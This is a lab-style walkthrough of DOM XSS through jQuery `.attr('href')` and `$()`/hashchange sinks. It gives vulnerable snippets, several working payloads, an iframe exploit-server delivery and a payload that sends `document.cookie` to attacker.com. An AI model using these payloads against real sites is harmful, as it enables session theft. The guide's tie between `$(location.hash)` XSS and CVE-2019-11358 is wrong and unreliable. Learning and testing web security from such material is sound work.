# DOM XSS — jQuery Sinks (`$()`, `.html()`, `.attr()`, hashchange)

## When this applies

The application uses jQuery and passes user-controllable data into jQuery's flexible APIs. jQuery sinks have unique behaviors:
- `$(input)` — selector OR HTML constructor depending on input shape; HTML-like strings parse and execute
- `$el.html(input)` — equivalent to `innerHTML` (event handlers required)
- `$el.attr('href', input)` — URL/href context, vulnerable to `javascript:` protocol
- `hashchange` event handlers reading `location.hash` — only fire when hash changes, not on initial load

## Technique

**Vulnerable patterns:**
```javascript
$(userInput)                    // Selector sink
$element.html(userInput)        // HTML sink
$element.attr('href', userInput) // Attribute sink
```

**Exploitation:**
```javascript
// For $(userInput)
<img src=x onerror=alert(1)>

// For .attr('href', ...)
javascript:alert(1)

// For .html()
<img src=x onerror=alert(1)>
```

## Steps

### Pattern 1 — `attr('href', …)` Set To `javascript:` URL

#### Vulnerable Code
```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

#### Vulnerability Analysis
- **Source:** `location.search` (returnPath parameter)
- **Sink:** jQuery `.attr()` setting href
- **Attack vector:** javascript: protocol
- **Requires:** User interaction (clicking the link)

#### Step-by-Step Solution

1. Navigate to `/feedback` page.
2. Observe "Back" link with id="backLink".
3. Test: `/feedback?returnPath=/test`.
4. Inspect link: `<a href="/test">Back</a>`.
5. Inject: `/feedback?returnPath=javascript:alert(document.cookie)`.
6. Click "Back" link.
7. Alert fires.

#### Working Payloads

```
javascript:alert(document.cookie)
javascript:alert(document.domain)
javascript:alert(1)
javascript:eval(atob('YWxlcnQoMSk='))
javascript:fetch('https://attacker.com?c='+document.cookie)
```

#### Complete URL
```
https://target.com/feedback?returnPath=javascript:alert(document.cookie)
```

#### How It Works

1. jQuery extracts `returnPath` from URL
2. Sets `href` attribute: `<a href="javascript:alert(document.cookie)">Back</a>`
3. When user clicks, browser executes the JavaScript
4. `javascript:` protocol tells browser to run code instead of navigate

#### Alternative Protocols

**Data URI:**
```
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**VBScript (IE only):**
```
vbscript:msgbox(1)
```

#### Burp Suite Workflow

**DOM Invader:**
1. Navigate to /feedback
2. DOM Invader shows attr sink
3. Click sink to see: `$('#backLink').attr("href", ...)`
4. Verify href contains canary
5. Replace with javascript:alert(document.cookie)

**Manual Testing:**
1. Intercept feedback page request
2. Add: `?returnPath=javascript:alert(document.cookie)`
3. Forward request
4. Click "Back" link on rendered page

### Pattern 2 — `$(selector)` With hashchange Event

#### Vulnerable Code
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

#### Vulnerability Analysis
- **Source:** `location.hash` (URL fragment)
- **Sink:** jQuery `$()` selector
- **Trigger:** `hashchange` event
- **Challenge:** Need to change the hash dynamically

#### Why Direct Navigation Fails

```
/#<img src=x onerror=alert(1)> ❌ No hash CHANGE occurs
```

The vulnerability only triggers when the hash **changes**, not on initial load.

#### Step-by-Step Solution

1. Understand that hashchange event needs a hash change.
2. Create iframe that loads page, then modifies hash.
3. Deploy via exploit server.
4. When loaded, hash changes and XSS fires.

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://target.com/#"
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

#### How It Works

1. **iframe loads:** `src="https://target.com/#"`
   - Page loads with empty hash
   - No hashchange event yet

2. **onload fires:** `this.src+='<img src=x onerror=print()>'`
   - Appends to iframe src
   - New src: `https://target.com/#<img src=x onerror=print()>`

3. **Hash changes:** From `#` to `#<img src=x onerror=print()>`
   - Triggers hashchange event

4. **Vulnerable code executes:**
   ```javascript
   $('section.blog-list h2:contains(<img src=x onerror=print()>)')
   ```

5. **jQuery parses HTML:** Creates img element, onerror fires

#### Alternative Payloads

```html
<iframe src="https://target.com/#" onload="this.src+='<svg onload=alert(1)>'"></iframe>
<iframe src="https://target.com/#" onload="this.src+='<input onfocus=alert(1) autofocus>'"></iframe>
<iframe src="https://target.com/#" onload="this.src+='<iframe src=javascript:alert(1)>'"></iframe>
```

#### Burp Suite Workflow

1. Open exploit server
2. Paste iframe payload in Body
3. Click "Store"
4. Click "View exploit" - print dialog should appear
5. Click "Deliver to victim" to solve

**Testing Manually:**
```javascript
// In browser console on the page
window.location.hash = '<img src=x onerror=alert(1)>';
```

## Verifying success

- For `attr('href', javascript:...)`: clicking the link triggers `alert`. The DOM element shows `<a href="javascript:...">` in DevTools.
- For hashchange `$(...)`: the iframe-driven hash modification triggers the payload after page load — `alert` fires inside the iframe.

## Common pitfalls

1. **`javascript:` protocol blocked by Trusted Types or framework router** — modern routers may sanitize URLs.
2. **`hashchange` confusion** — you must *change* the hash, not just load with one. Initial-load hash doesn't fire the event.
3. **`$()` HTML detection requires angle brackets early in input** — jQuery checks if string starts with `<`. `<img>` works; `text<img>` may be treated as a selector.
4. **Older jQuery versions (< 3.4.0)** — vulnerable to `$(location.hash)` directly (CVE-2019-11358 family).
5. **iframe sandboxing** — `<iframe sandbox>` blocks scripts by default. Don't sandbox the delivery iframe.

## Tools

- **DOM Invader** — detects jQuery sinks with stack traces
- **`grep -rE '\\$\\(|\\.attr\\(|\\.html\\(|\\.on\\([\\\'\"]hashchange'`** — find jQuery sink patterns in bundled JS
- **PortSwigger exploit server** — host the iframe payload for hashchange exploitation
